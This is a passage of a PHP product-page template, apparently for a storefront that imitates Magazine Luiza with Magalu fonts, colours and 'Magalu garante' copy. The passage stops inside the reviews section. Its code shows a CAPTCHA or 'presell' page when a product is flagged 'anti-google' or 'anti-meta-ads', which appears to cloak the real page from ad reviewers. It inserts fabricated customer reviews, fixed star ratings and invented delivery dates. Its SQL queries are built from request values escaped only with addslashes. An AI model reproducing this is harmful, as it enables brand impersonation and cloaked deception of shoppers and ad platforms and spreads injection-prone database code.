<?php 
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

	$prod_param = $_GET["produto"] ?? ($_GET["codigo"] ?? ($_GET["id"] ?? ''));
	if (empty($prod_param)) {
	    session_destroy();
	    header("Location: ./index");
	    exit();
	} else {
	    $id = addslashes($prod_param);
	    $sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
	    
	    if (($sqlx ? mysqli_num_rows($sqlx) : 0) > 0) {
            $row_status = mysqli_fetch_assoc($sqlx);
            $status_atual = isset($row_status['status']) ? $row_status['status'] : 'ativo';
            
            // 1. Verificar Anti-Crawler (reCAPTCHA)
            if ($status_atual == 'anti-crawler-v1' && !isset($_SESSION['captcha_solved_' . $id])) {
                include("api/crawler_captcha.php");
                exit();
            }
            
	            // 2. Verificar Anti-Google / Anti-Meta (Presell)
	            if (($status_atual == 'anti-google-v1' || $status_atual == 'anti-meta-ads-v1') && !isset($_GET['bypass'])) {
	                // Se tiver step >= 2, deixa passar com bypass interno
	                if (isset($_GET['step']) && (int)$_GET['step'] >= 2) {
	                    // Continua para o produto
	                } else {
	                    include("api/presell.php");
	                    exit();
	                }
	            }
            
            // Resetar ponteiro para o loop original
            mysqli_data_seek($sqlx, 0);
        $_SESSION['session_index'] = time() + 1000;
        
		$sql = mysqli_query($conn, "SELECT * from config");
		$cor = "#3483fa";
		$cor_botao = "#3483fa";
		$cor_icones = "#ffffff";
		$nome = "Minha Loja";
		$numerozap = "";
		$textozap = "";
		$endereco = "";
		$cnpj = "";
		while ($sql && $row = mysqli_fetch_array($sql)) { 
			$cor = $row["cor"];
			$cor_botao = isset($row["cor_botao"]) ? $row["cor_botao"] : "#3483fa";
			$cor_icones = isset($row["cor_icones"]) ? $row["cor_icones"] : "#ffffff";
			$nome = $row["nome"];
			$numerozap = $row["zap"];
			$textozap = $row["texto"];
			$endereco = isset($row["endereco"]) ? $row["endereco"] : "";
			$cnpj = isset($row["cnpj"]) ? $row["cnpj"] : "";
		}
        
		        $sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
		        while ($sql1 && $row1 = mysqli_fetch_array($sql1)) { 
		            $codigo = $row1["codigo"];
		            $nomeproduto = $row1["nome"];
		            $valor = $row1["valor"];
		            $img = $row1["img"];
		            $desconto = $row1["desconto"];
		            $descricao = $row1["descricao"];
		            $oferta = $row1["oferta"];
		            $img1 = $row1["img1"];
		            $img2 = $row1["img2"];
		            $img3 = $row1["img3"];
		            $img4 = $row1["img4"];
		            $img5 = $row1["img5"];
		            $img6 = $row1["img6"];
		            $caracteristicas = $row1["caracteristicas"];
		            $reviews_json = $row1["reviews"];
		            $valor_original_db = isset($row1["valor_original"]) ? $row1["valor_original"] : "";
		            $tipo_produto = isset($row1["tipo_produto"]) ? $row1["tipo_produto"] : "generico";
		            $categoria_atual = isset($row1["categoria"]) ? $row1["categoria"] : "Geral";
	                    $variacoes_json = isset($row1["variacoes"]) ? $row1["variacoes"] : "";
	                    $variacoes = !empty($variacoes_json) ? json_decode($variacoes_json, true) : array();
	                    // Para roupas, manter somente os tamanhos padronizados da loja.
	                    if ($tipo_produto === 'roupa' && !empty($variacoes['tamanhos'])) {
	                        $tamanhos_permitidos = array('P', 'M', 'G', 'GG');
	                        $variacoes['tamanhos'] = array_values(array_intersect(
	                            $tamanhos_permitidos,
	                            array_map('strtoupper', array_map('trim', (array)$variacoes['tamanhos']))
	                        ));
	                    }
	                }
                // Garantir que as vari├íveis b├ísicas existam se o loop falhar por algum motivo
                if(!isset($codigo)) { $codigo = $id; }
        
        $sql12 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
        $cliques = 0;
        $pid = 0;
        while ($sql12 && $row1 = mysqli_fetch_array($sql12)) { 
            $pid = $row1['id'];	
            $cliques = $row1['cliques'];	
        }

        // Registrar clique no produto (evitar bots e duplicidade via session e cookie)
        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|spider|slurp|facebook|google/i', $user_agent);
        $cookie_name = 'product_click_' . $id;
        
        if (!$is_bot && !isset($_SESSION[$cookie_name]) && !isset($_COOKIE[$cookie_name])) {
            $novoclick = $cliques + 1;
            mysqli_query($conn, "UPDATE produto SET cliques='$novoclick' WHERE id='$pid'");
            $_SESSION[$cookie_name] = true;
            setcookie($cookie_name, '1', time() + 86400 * 7, '/'); // Cookie v├ílido por 7 dias
        }
        
	        $valor_total = (float)str_replace(',', '.', str_replace('.', '', $valor));
	        $desconto_num = (float)$desconto;
	        
	        // Disparar ViewContent no Pixel
	        echo fb_pixel_event_script('ViewContent', [
	            'content_ids' => [$codigo],
	            'content_name' => $nomeproduto,
	            'content_type' => 'product',
	            'value' => $valor_total,
	            'currency' => 'BRL'
	        ]);
        $qtde_parcelas = 12;
        
        function parcelas($montante, $parcelas) {
            $resultado = array();
            $centavos = (float)$montante * 100; 
            array_push($resultado, (floor($centavos / $parcelas) + fmod($centavos, $parcelas)) / 100.0);
            for ($i = 1; $i < $parcelas; $i++) {
                array_push($resultado, floor($centavos / $parcelas) / 100.0);
            }
            return $resultado;
        }
        $parcela12 = parcelas($valor_total, $qtde_parcelas);
        
        if (!empty($valor_original_db)) {
            $valor_original = (float)str_replace(',', '.', str_replace('.', '', $valor_original_db));
        } else {
            if ($desconto_num > 0 && $desconto_num < 100) {
                $valor_original = round($valor_total / (1 - ($desconto_num / 100)), 2);
            } else {
                $valor_original = $valor_total;
            }
        }
        
        $todas_imgs = array();
        for ($i = 1; $i <= 6; $i++) {
            $var_img = "img" . $i;
            if (!empty($$var_img)) {
                $todas_imgs[] = $$var_img;
            }
        }
        if (empty($todas_imgs)) {
            $imgs_locais = glob("arquivos/produtos/" . $codigo . "/*.png");
            if (!empty($imgs_locais)) {
                foreach ($imgs_locais as $img_p) { $todas_imgs[] = $img_p; }
            }
        }
        if (empty($todas_imgs)) { $todas_imgs[] = "./arquivos/produto.jpg"; }
        
        $logo_files = glob("arquivos/logo/*.png");
        $logo_loja = !empty($logo_files) ? $logo_files[0] : "";
        
        $sql_config = mysqli_query($conn, "SELECT zap, zap_cotacao, zap_flutuante_ativo FROM config LIMIT 1");
        $zap_cotacao = "";
        $zap_flutuante_ativo = "1";
        if ($sql_config && $row_config = mysqli_fetch_assoc($sql_config)) {
            $zap_cotacao = (isset($row_config["zap_cotacao"]) && !empty($row_config["zap_cotacao"])) ? $row_config["zap_cotacao"] : $row_config["zap"];
            $zap_flutuante_ativo = isset($row_config["zap_flutuante_ativo"]) ? $row_config["zap_flutuante_ativo"] : "1";
        }
        
	        $outros_produtos = array();
	        // Buscar produtos da mesma categoria para o carrossel de baixo
	        $sql_outros = mysqli_query($conn, "SELECT * from produto WHERE codigo != '$codigo' AND categoria = '$categoria_atual' AND categoria != 'Geral' LIMIT 20");
	        if (mysqli_num_rows($sql_outros) == 0) {
	            $sql_outros = mysqli_query($conn, "SELECT * from produto WHERE codigo != '$codigo' LIMIT 20");
	        }
	        while ($sql_outros && $row_outro = mysqli_fetch_array($sql_outros)) { 
	            $outros_produtos[] = $row_outro;
	        }
	        
	        // Buscar produtos relacionados espec├¡ficos para o carrossel de cima
	        $produtos_relacionados_especificos = array();
	        if (!empty($row1['produtos_relacionados'])) {
	            $codigos_relacionados = array_map('trim', explode(',', $row1['produtos_relacionados']));
	            $in_clause = "'" . implode("','", $codigos_relacionados) . "'";
	            $sql_especificos = mysqli_query($conn, "SELECT * from produto WHERE codigo IN ($in_clause) OR id IN ($in_clause) LIMIT 20");
	            while ($sql_especificos && $row_especifico = mysqli_fetch_array($sql_especificos)) { 
	                $produtos_relacionados_especificos[] = $row_especifico;
	            }
	        }
	        // Fallback: se estiver vazio, puxa os mesmos do carrossel de baixo para n├úo sumir o banner
	        if (empty($produtos_relacionados_especificos)) {
	            $produtos_relacionados_especificos = $outros_produtos;
	        }
    } else {
        session_destroy();
        header("Location: ./index");
        exit();
    }
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<title><?php echo htmlspecialchars($nomeproduto); ?> — <?php echo htmlspecialchars($nome); ?></title>
<meta name="theme-color" content="#0086FF">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdn.tailwindcss.com"></script>
<script>
  tailwind.config = {
    theme: {
      extend: {
        fontFamily: {
          sans: ['"Magalu UI"', 'Tahoma', 'sans-serif'],
        },
        colors: {
          primary: { DEFAULT: '#0086ff', foreground: '#fff', dark: '#0075e2' },
          success: { DEFAULT: '#08a022', dark: '#067418' },
          warning: { DEFAULT: '#f8bf1b' },
          background: '#f0f3f4',
          foreground: '#1e2428',
          secondary: '#e3e8ea',
          muted: { DEFAULT: '#d3dadd', foreground: '#51585c' },
          border: '#e3e8ea',
          card: '#fff',
        }
      }
    }
  }
</script>
<style>
  @font-face {
    font-display: swap;
    font-family: Magalu UI;
    src: url(https://m.magazineluiza.com.br/tom/fonts/magalu-ui-variable/files/MagaluUIVariable.woff2) format("woff2");
  }
  body {
    font-family: "Magalu UI", Tahoma, sans-serif;
  }
  .scrollbar-hide::-webkit-scrollbar { display: none; }
  .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
  .btn-variacao-cor.active { border-color: #0086ff; border-width: 2px; }
  .btn-variacao-texto.active { border-color: #0086ff; background-color: rgba(0,134,255,0.05); color: #0086ff; }
  #store-loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
  .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0086ff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  
  /* Desktop thumbs */
  .pdp-thumb { opacity: 0.6; cursor: pointer; border: 2px solid transparent; border-radius: 8px; transition: 0.2s; }
  .pdp-thumb:hover { opacity: 1; }
  .pdp-thumb.active { opacity: 1; border-color: #0086ff; }
</style>
<?php echo fb_pixel_base_code(); ?>
</head>
<body class="min-h-screen bg-background pb-32 md:pb-0">
<?php echo fb_pixel_event_script('ViewContent', ['content_ids'=>[$codigo], 'contents'=>[['id'=>$codigo, 'quantity'=>1, 'item_price'=>(float)str_replace(',', '.', str_replace('.', '', $valor))]], 'content_name'=>$nomeproduto, 'content_type'=>'product', 'value'=>(float)str_replace(',', '.', str_replace('.', '', $valor)), 'currency'=>'BRL']); ?>

<header class="bg-primary text-primary-foreground sticky top-0 z-50 shadow-md">
  <div class="max-w-7xl mx-auto">
    <div class="flex items-center justify-between px-3 h-14 md:h-20">
      <div class="flex items-center gap-3">
        <button aria-label="Menu" class="p-1 active:opacity-70 md:hidden text-white"><i class="fa-solid fa-bars text-xl"></i></button>
        <a href="./index.php" class="flex items-center leading-none">
          <?php if(!empty($logo_loja)): ?>
            <img alt="<?php echo htmlspecialchars($nome); ?>" class="block h-[24px] md:h-[40px] w-auto max-w-[128px] md:max-w-[200px] object-contain" src="<?php echo $logo_loja; ?>">
          <?php else: ?>
            <span class="font-bold text-lg md:text-2xl text-white"><?php echo htmlspecialchars($nome); ?></span>
          <?php endif; ?>
        </a>
      </div>
      <form class="hidden md:flex flex-1 max-w-2xl mx-8 bg-white rounded-lg overflow-hidden" action="catalogo.php" method="GET">
        <input placeholder="Buscar no <?php echo htmlspecialchars($nome); ?>" name="q" class="flex-1 px-4 py-3 text-foreground bg-white outline-none text-base" type="search">
        <button type="submit" aria-label="Buscar" class="px-6 py-3 text-primary bg-secondary/50 hover:bg-secondary transition-colors"><i class="fa-solid fa-magnifying-glass text-lg"></i></button>
      </form>
      <div class="flex items-center gap-3 text-white">
        <div class="hidden md:flex flex-col text-xs text-right mr-2">
          <span class="opacity-80">Atendimento</span>
          <span class="font-bold"><?php echo htmlspecialchars($zap_cotacao); ?></span>
        </div>
        <a aria-label="Favoritar" class="p-1 active:opacity-70 hover:text-white/80"><i class="fa-regular fa-heart text-xl"></i></a>
        <a aria-label="Sacola" href="checkout.php?produto=<?php echo $codigo; ?>" class="p-1 active:opacity-70 hover:text-white/80 relative">
          <i class="fa-solid fa-cart-shopping text-xl"></i>
          <span class="absolute -top-1 -right-1 bg-success text-white text-[10px] font-bold h-4 w-4 flex items-center justify-center rounded-full">0</span>
        </a>
        <a aria-label="Conta" class="p-1 active:opacity-70 md:hidden"><i class="fa-regular fa-circle-user text-xl"></i></a>
      </div>
    </div>
    <!-- Mobile Search -->
    <form class="px-3 pb-3 md:hidden" action="catalogo.php" method="GET">
      <div class="flex items-center bg-white rounded-md overflow-hidden h-10">
        <input placeholder="Buscar no <?php echo htmlspecialchars($nome); ?>" name="q" class="flex-1 px-3 text-foreground bg-white outline-none text-sm" type="search">
        <button type="submit" aria-label="Buscar" class="px-3 text-primary"><i class="fa-solid fa-magnifying-glass"></i></button>
      </div>
    </form>
  </div>
  <!-- Mobile Location Bar -->
  <div class="bg-[#0075e2] px-3 py-2 text-white flex items-center justify-between text-sm md:hidden">
    <div class="flex items-center gap-2">
      <i class="fa-solid fa-location-dot"></i>
      <span>Região de Brasília/DF</span>
    </div>
    <i class="fa-solid fa-chevron-down text-xs"></i>
  </div>
</header>

<main class="max-w-7xl mx-auto flex flex-col md:grid md:grid-cols-[1.5fr_1fr] lg:grid-cols-[2fr_1fr] md:gap-x-8 md:gap-y-6 md:pt-6 md:px-4 md:mb-12">
  
  <!-- 1. IMAGENS E TÍTULO MOBILE (DOM: 1) -->
  <div class="md:col-start-1 md:row-start-1 bg-white md:rounded-t-lg md:border-t md:border-x md:border-border md:p-8 md:pb-0">
    
    <!-- Mobile Image Carousel -->
    <div class="relative overflow-hidden touch-pan-y select-none md:hidden bg-white mt-2">
      <div class="absolute top-4 right-4 z-10">
        <button class="w-10 h-10 bg-secondary rounded-full flex items-center justify-center text-primary shadow-sm hover:bg-secondary/80 transition-colors">
          <i class="fa-regular fa-heart text-xl"></i>
        </button>
      </div>
      <div class="flex overflow-x-auto snap-x snap-mandatory scrollbar-hide" id="carouselTrack">
        <?php foreach($todas_imgs as $idx => $img_url): ?>
        <div class="carousel-slide w-full shrink-0 aspect-square flex items-center justify-center p-4 snap-center relative">
          <img alt="<?php echo htmlspecialchars($nomeproduto); ?>" class="max-w-full max-h-full object-contain pointer-events-none <?php echo $idx === 0 ? 'main-img-first' : ''; ?>" src="<?php echo $img_url; ?>">
        </div>
        <?php endforeach; ?>
      </div>
      <div class="absolute bottom-10 right-4 z-10">
        <button class="w-10 h-10 bg-secondary rounded-full flex items-center justify-center text-primary shadow-sm hover:bg-secondary/80 transition-colors">
          <i class="fa-solid fa-share-nodes text-xl"></i>
        </button>
      </div>
      <div class="flex justify-center pb-3 gap-1.5">
        <?php foreach($todas_imgs as $dot_idx => $dot_url): ?>
          <span class="carousel-dot h-1.5 w-1.5 rounded-full transition-colors <?php echo $dot_idx === 0 ? 'bg-primary active' : 'bg-border'; ?>"></span>
        <?php endforeach; ?>
      </div>
    </div>

    <!-- Title only mobile -->
    <div class="md:hidden px-4 pt-4 pb-4 bg-white">
      <div class="flex items-center justify-between mb-2">
        <span class="bg-primary text-white text-[11px] font-bold px-2 py-0.5 rounded flex items-center gap-1"><i class="fa-solid fa-truck-fast"></i> Full</span>
        <div class="flex items-center gap-1">
          <i class="fa-solid fa-star text-warning text-sm"></i>
          <span class="text-sm text-muted-foreground font-semibold">4.8 (100)</span>
        </div>
      </div>
      <h1 class="text-[17px] font-semibold leading-snug text-foreground/90" id="produtoTitulo"><?php echo htmlspecialchars($nomeproduto); ?></h1>
    </div>

    <!-- Desktop Image Gallery -->
    <div class="hidden md:flex gap-6 mb-8 h-[500px]">
      <div class="w-[80px] flex flex-col gap-3 overflow-y-auto scrollbar-hide py-1">
        <?php foreach($todas_imgs as $idx => $img_url): ?>
        <div class="pdp-thumb aspect-square bg-white border border-border rounded-lg overflow-hidden flex items-center justify-center <?php echo $idx === 0 ? 'active' : ''; ?>" onclick="changeMainImage('<?php echo $img_url; ?>', <?php echo $idx; ?>)">
          <img src="<?php echo $img_url; ?>" class="max-w-full max-h-full object-contain">
        </div>
        <?php endforeach; ?>
      </div>
      <div class="flex-1 flex items-center justify-center bg-white">
        <img id="pdpMainImg" src="<?php echo $todas_imgs[0]; ?>" alt="<?php echo htmlspecialchars($nomeproduto); ?>" class="max-w-full max-h-full object-contain main-img-first">
      </div>
    </div>
  </div>

  <!-- 2. BUYBOX (DOM: 2) -->
  <div class="md:col-start-2 md:row-start-1 md:row-span-4 md:sticky md:top-[100px] md:self-start bg-white md:rounded-lg md:border md:border-border md:p-6 md:shadow-sm">
    
    <!-- Title / Price info (Desktop Only) -->
    <div class="hidden md:block mb-4">
      <div class="flex items-center gap-1 mb-2">
        <div class="flex text-warning text-xs">
          <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
        </div>
        <span class="text-sm text-muted-foreground ml-1">4.9 (102)</span>
      </div>
      <h1 class="text-2xl font-semibold leading-tight text-foreground/90" id="produtoTituloDesktop"><?php echo htmlspecialchars($nomeproduto); ?></h1>
    </div>

    <!-- Variações -->
    <?php if(!empty($variacoes)): ?>
    <div class="px-4 md:px-0 py-4 md:py-0 mt-2 md:mt-0 bg-white md:bg-transparent space-y-5 md:pt-4">
      <?php if($tipo_produto === 'celular' && !empty($variacoes['armazenamento'])): ?>
      <div class="text-center md:text-left">
        <span class="block text-[15px] mb-3 text-foreground">Armazenamento interno: <span class="font-bold" id="label-armazenamento">Escolha</span></span>
        <div class="flex gap-2 flex-wrap justify-center md:justify-start">
          <?php foreach($variacoes['armazenamento'] as $idx => $armazenamento): ?>
          <button class="btn-variacao-texto border <?php echo $idx === 0 ? 'border-primary bg-primary text-white active' : 'border-border text-foreground hover:border-foreground/30'; ?> rounded-full px-5 py-2 text-sm transition-all"
                  data-tipo="armazenamento" data-valor="<?php echo htmlspecialchars($armazenamento); ?>">
            <?php echo htmlspecialchars($armazenamento); ?>
          </button>
          <?php endforeach; ?>
        </div>
      </div>
      <?php endif; ?>

      <?php if(!empty($variacoes['cores_detalhes'])): ?>
      <div class="text-center md:text-left">
        <span class="block text-[15px] mb-3 text-foreground">Cor: <span class="font-bold" id="label-cor"><?php echo htmlspecialchars($variacoes['cores_detalhes'][0]['nome']); ?></span></span>
        <div class="flex gap-3 flex-wrap justify-center md:justify-start">
          <?php foreach($variacoes['cores_detalhes'] as $idx => $cor_obj): 
              $img_cor = !empty($cor_obj['img']) ? $cor_obj['img'] : $todas_imgs[0]; 
          ?>
          <div class="btn-variacao-cor cursor-pointer w-[60px] h-[60px] border rounded-lg p-[2px] <?php echo $idx === 0 ? 'border-primary border-2 active' : 'border-border'; ?> transition-colors"
               data-tipo="cor" 
               data-valor="<?php echo htmlspecialchars($cor_obj['nome']); ?>"
               data-titulo-variacao="<?php echo htmlspecialchars($cor_obj['titulo'] ?? $nomeproduto); ?>"
               data-img-variacao="<?php echo htmlspecialchars($img_cor, ENT_QUOTES, 'UTF-8'); ?>">
            <img src="<?php echo htmlspecialchars($img_cor, ENT_QUOTES, 'UTF-8'); ?>" class="w-full h-full object-cover rounded pointer-events-none">
          </div>
          <?php endforeach; ?>
        </div>
      </div>
      <?php endif; ?>

      <?php if($tipo_produto === 'eletronico' && !empty($variacoes['voltagens'])): ?>
      <div class="text-center md:text-left">
        <span class="block text-[15px] mb-3 text-foreground">Voltagem: <span class="font-bold" id="label-voltagem">Escolha</span></span>
        <div class="flex gap-2 flex-wrap justify-center md:justify-start">
          <?php foreach($variacoes['voltagens'] as $idx => $voltagem): ?>
          <button class="btn-variacao-texto border <?php echo $idx === 0 ? 'border-primary bg-primary text-white active' : 'border-border text-foreground hover:border-foreground/30'; ?> rounded-full px-5 py-2 text-sm transition-all"
                  data-tipo="voltagem" data-valor="<?php echo htmlspecialchars($voltagem); ?>">
            <?php echo htmlspecialchars($voltagem); ?>
          </button>
          <?php endforeach; ?>
        </div>
      </div>
      <?php endif; ?>

      <?php if(($tipo_produto === 'roupa' || $tipo_produto === 'calcado') && !empty($variacoes['tamanhos'])): ?>
      <div class="text-center md:text-left">
        <span class="block text-[15px] mb-3 text-foreground">Tamanho: <span class="font-bold" id="label-tamanho">Escolha</span></span>
        <div class="flex gap-2 flex-wrap justify-center md:justify-start">
          <?php foreach($variacoes['tamanhos'] as $idx => $tamanho): ?>
          <button class="btn-variacao-texto border <?php echo $idx === 0 ? 'border-primary bg-primary text-white active' : 'border-border text-foreground hover:border-foreground/30'; ?> rounded-full px-5 py-2 text-sm transition-all"
                  data-tipo="tamanho" data-valor="<?php echo htmlspecialchars($tamanho); ?>">
            <?php echo htmlspecialchars($tamanho); ?>
          </button>
          <?php endforeach; ?>
        </div>
      </div>
      <?php endif; ?>
    </div>
    <?php endif; ?>

    <div class="text-center md:text-left px-4 md:px-0 py-4 text-sm text-muted-foreground border-b-8 border-background md:border-0 md:mb-4">
      Vendido e entregue por <strong class="text-foreground"><?php echo htmlspecialchars($nome); ?></strong>
    </div>

    <!-- Preço -->
    <div class="px-4 md:px-0 py-4 bg-white md:bg-transparent border-b-8 border-background md:border-0">
      <div class="mt-2">
        <?php if($valor_original > $valor_total): ?>
        <p class="text-[13px] text-muted-foreground line-through">de R$ <?php echo number_format($valor_original, 2, ',', '.'); ?></p>
        <?php endif; ?>
        <div class="flex items-center gap-1.5 flex-wrap">
          <p class="text-[34px] font-bold text-foreground">R$ <?php echo number_format($valor_total, 2, ',', '.'); ?></p>
          <span class="text-[13px] font-semibold text-foreground mt-2">no Pix</span>
          <?php if($desconto_num > 0): ?>
          <span class="bg-success/10 text-success text-[11px] font-bold px-1.5 py-0.5 rounded ml-1 mt-2"><?php echo $desconto; ?>% OFF</span>
          <?php endif; ?>
        </div>
        <div class="text-[14px] text-foreground mt-1">
          ou R$ <?php echo number_format($valor_original > 0 ? $valor_original : $valor_total * 1.15, 2, ',', '.'); ?> em <span class="text-foreground">10x R$ <?php echo number_format(($valor_original > 0 ? $valor_original : $valor_total * 1.15) / 10, 2, ',', '.'); ?> sem juros</span>
        </div>
        <div class="mt-2">
          <a href="#" class="text-primary text-[14px] font-semibold">Ver opções de pagamento <i class="fa-solid fa-chevron-right text-[10px]"></i></a>
        </div>
      </div>
    </div>

    <!-- Entrega -->
    <div class="px-4 md:px-0 py-4 bg-white md:bg-transparent border-b-8 border-background md:border-0">
      <div class="bg-secondary/40 px-4 py-4 rounded-xl border border-border/50">
        <div class="flex items-center justify-between mb-2">
          <div class="flex items-center gap-2 text-primary font-semibold text-sm">
            <i class="fa-solid fa-location-dot"></i>
            <span>Região de Brasília/DF</span>
          </div>
          <a href="#" class="text-primary text-sm font-semibold">Alterar</a>
        </div>
        <p class="text-[12px] text-muted-foreground mb-4">Informe seu CEP para valores e prazos exatos.</p>
        
        <div class="space-y-4">
          <div class="flex items-start justify-between">
            <div class="flex items-start gap-3">
              <i class="fa-solid fa-truck text-muted-foreground text-lg mt-0.5"></i>
              <div>
                <p class="text-[14px] text-foreground">Receba até quarta-feira, 23 de setembro</p>
                <p class="text-[12px] text-muted-foreground">Para pagamentos confirmados hoje</p>
              </div>
            </div>
            <span class="font-bold text-[14px] whitespace-nowrap ml-2">R$ 9,90</span>
          </div>
          <div class="flex items-start justify-between">
            <div class="flex items-start gap-3">
              <i class="fa-solid fa-store text-muted-foreground text-lg mt-0.5"></i>
              <div>
                <p class="text-[14px] text-foreground">Retire na loja a partir de terça-feira, 22 de setembro</p>
                <p class="text-[12px] text-muted-foreground">Após o pagamento confirmado</p>
              </div>
            </div>
            <span class="font-bold text-[14px] text-success whitespace-nowrap ml-2">Grátis</span>
          </div>
        </div>
      </div>
    </div>
    
    <!-- Botões -->
    <div class="px-4 md:px-0 py-4 bg-white md:bg-transparent border-b-8 border-background md:border-0 space-y-3">
      <a id="btnMainSacola" href="checkout.php?produto=<?php echo $codigo; ?>" class="btn-comprar w-full bg-success hover:bg-success-dark text-white font-bold py-3.5 rounded-lg flex items-center justify-center gap-2 text-[16px] shadow-sm transition-transform active:scale-[0.98]">
        <i class="fa-solid fa-bag-shopping"></i> Adicionar à sacola
      </a>
      <a href="checkout.php?produto=<?php echo $codigo; ?>" class="btn-comprar w-full bg-white border border-success text-success font-bold py-3.5 rounded-lg flex items-center justify-center text-[16px] transition-all">
        Comprar agora
      </a>
      <a href="checkout.php?produto=<?php echo $codigo; ?>" class="btn-comprar w-full bg-primary hover:bg-primary-dark text-white font-bold py-3.5 rounded-lg flex items-center justify-center text-[16px] transition-all">
        Retire na loja!
      </a>
    </div>

    <!-- Benefícios -->
    <div class="px-4 md:px-0 py-4 bg-white md:bg-transparent border-b-8 border-background md:border-0">
      <div class="border border-border rounded-xl divide-y divide-border bg-white md:bg-secondary/20 shadow-sm">
        <div class="w-full flex items-center gap-4 px-4 py-4 text-left">
          <i class="fa-solid fa-truck-fast text-primary text-xl w-6 text-center"></i>
          <p class="text-[13px] flex-1 leading-snug text-foreground/90"><strong class="text-foreground">Entrega Full</strong> é entrega rápida, frete barato e mais segurança para você.</p>
          <i class="fa-solid fa-chevron-right text-primary text-xs"></i>
        </div>
        <div class="w-full flex items-center gap-4 px-4 py-4 text-left">
          <i class="fa-solid fa-shield-halved text-primary text-xl w-6 text-center"></i>
          <p class="text-[13px] flex-1 leading-snug text-foreground/90"><strong class="text-foreground">Magalu garante</strong> a sua compra, do pedido à entrega.</p>
          <i class="fa-solid fa-chevron-right text-primary text-xs"></i>
        </div>
        <div class="w-full flex items-center gap-4 px-4 py-4 text-left">
          <i class="fa-solid fa-rotate-left text-primary text-xl w-6 text-center"></i>
          <p class="text-[13px] flex-1 leading-snug text-foreground/90"><strong class="text-foreground">Devolução Gratuita</strong> em até 7 dias depois de receber o produto.</p>
          <i class="fa-solid fa-chevron-right text-primary text-xs"></i>
        </div>
      </div>
    </div>

  </div>

  <!-- 3. DESCRIÇÃO E FICHA TÉCNICA (DOM: 3) -->
  <div class="md:col-start-1 md:row-start-2 bg-white md:border-x md:border-border md:px-8 py-4 md:py-6 mt-2 md:mt-0 border-b-8 border-background md:border-b-0">
    <!-- Ficha técnica -->
    <?php if(!empty($caracteristicas)): ?>
    <div class="px-3 md:px-0 mb-8">
      <h2 class="text-xl font-bold mb-4 text-foreground">Ficha técnica</h2>
      <div class="text-[15px] whitespace-pre-line leading-relaxed text-foreground/80 bg-secondary/30 p-5 md:p-6 rounded-xl border border-border/50">
        <?php echo nl2br(htmlspecialchars($caracteristicas)); ?>
      </div>
    </div>
    <div class="hidden md:block w-full h-[1px] bg-border my-8"></div>
    <?php endif; ?>

    <!-- Descrição -->
    <div class="px-3 md:px-0">
      <h2 class="text-xl font-bold mb-4 text-foreground">Descrição do produto</h2>
      <div class="text-[15px] whitespace-pre-line leading-relaxed text-foreground/80 overflow-hidden transition-all duration-300 relative max-h-[250px] md:max-h-[400px]" id="descricaoTexto">
          <?php echo nl2br(htmlspecialchars($descricao)); ?>
          <div class="absolute bottom-0 left-0 w-full h-24 bg-gradient-to-t from-white to-transparent" id="descricaoGradient"></div>
      </div>
      <button id="btnVerMais" onclick="toggleDescricao()" class="text-primary font-bold text-sm mt-4 py-2 hover:underline">Ver descrição completa <i class="fa-solid fa-chevron-down"></i></button>
    </div>
  </div>

  <!-- 4. AVALIAÇÕES (DOM: 4) -->
  <div class="md:col-start-1 md:row-start-3 bg-white md:rounded-b-lg md:border-b md:border-x md:border-border md:px-8 py-6 md:pb-8 mt-2 md:mt-0 mb-4 md:mb-0 border-b-8 border-background md:border-b-0">
    <div class="hidden md:block w-full h-[1px] bg-border mb-8"></div>
    <div class="px-3 md:px-0">
      <h2 class="text-xl font-bold mb-6">Avaliações de clientes</h2>
      <?php
        $reviews = json_decode(stripslashes($reviews_json ?? ''), true);
        if(empty($reviews)) {
          $reviews = [
            ["nome"=>"Cláudia Martins","data"=>"15/04/2026","estrelas"=>5,"titulo"=>"Superou todas as expectativas!","texto"=>"Produto incrível! Chegou antes do prazo, embalagem impecável e a qualidade é muito melhor do que eu esperava.","fotos"=>[$todas_imgs[0]]],
            ["nome"=>"Sérgio Gomes","data"=>"10/04/2026","estrelas"=>5,"titulo"=>"Entrega rápida e produto top!","texto"=>"O produto é exatamente como descrito, acabamento de primeira e muito resistente. Atendimento nota 10!","fotos"=>[$todas_imgs[0]]],
            ["nome"=>"Fernanda Oliveira","data"=>"05/04/2026","estrelas"=>5,"titulo"=>"Melhor compra que já fiz!","texto"=>"Estou muito satisfeita com a compra. O produto chegou bem embalado, sem nenhum dano.","fotos"=>[$todas_imgs[0]]]
          ];
        }
      ?>
      <div class="space-y-6">
        <?php foreach($reviews as $rev): 
          $estrelas = isset($rev['estrelas']) ? (int)$rev['estrelas'] : 5;
          $nome_rev = isset($rev['nome']) ? $rev['nome'] : "Cliente";
          $data_rev = isset($rev['data']) ? $rev['data'] : date('d/m/Y');
          $titulo_rev = isset($rev['titulo']) ? $rev['titulo'] : "Excelente";
          $texto_rev = isset($rev['texto']) ? $rev['texto'] : "";
          $fotos_rev = isset($rev['fotos']) ? $rev['fotos'] : array();
        ?>
        <div class="border-b border-border pb-6 last:border-0">
          <div class="flex items-start gap-3 mb-2">
            <div class="w-10 h-10 rounded-full bg-secondary flex items-center justify-center text-muted-foreground font-bold text-lg shrink-0">
